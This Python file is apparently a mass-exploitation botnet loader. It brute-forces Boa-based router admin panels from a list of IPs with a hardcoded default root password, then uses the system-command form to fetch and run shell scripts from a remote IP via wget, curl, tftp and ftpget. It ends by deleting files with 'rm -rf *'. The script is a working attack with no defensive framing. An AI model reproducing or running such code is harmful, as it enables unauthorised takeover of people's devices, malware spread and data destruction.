# skids fr
import concurrent.futures
import requests

def read_ips_from_file(file_path):
    with open(file_path, "r") as file:
        return file.read().strip()

#x
def perform_login(ip_port):
    url_login = f"http://{ip_port}/boafrm/formLogin"

    headers_login = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
    }

    data_login = {
        "challenge": "",
        "username": "root",
        "password": "super070!!",
        "save": "%EB%A1%9C%EA%B7%B8%EC%9D%B8",
    }

    try:
        response_login = requests.post(url_login, headers=headers_login, data=data_login, allow_redirects=False, timeout=8)
        response_login.raise_for_status()  
    except requests.exceptions.Timeout:

        return
    except requests.exceptions.RequestException:

        return

    if "home.htm" in response_login.text:
        print(f"logged in {ip_port}")
        perform_post_login_action(ip_port)

def perform_post_login_action(ip_port):
    url_sys_cmd = f"http://{ip_port}/boafrm/formSysCmd"

    headers_sys_cmd = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
        "Connection": "close",
    }

    data_sys_cmd = {
        "sysCmd": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.15.36.146/1.sh; curl -O http://194.15.36.146/1.sh; chmod 777 1.sh; sh 1.sh; tftp 194.15.36.146 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 194.15.36.146; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 194.15.36.146 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *",
        "apply": "Apply",
        "submit-url": "/syscmd.htm",
        "msg": "",
    }

    try:
        requests.post(url_sys_cmd, headers=headers_sys_cmd, data=data_sys_cmd, timeout=8)
        print(f"exploited {ip_port}")
    except requests.exceptions.RequestException:
        
        pass

#x
ips_file_path = "ips.txt"
ip_ports = read_ips_from_file(ips_file_path).splitlines()

#x
with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(perform_login, ip_ports)
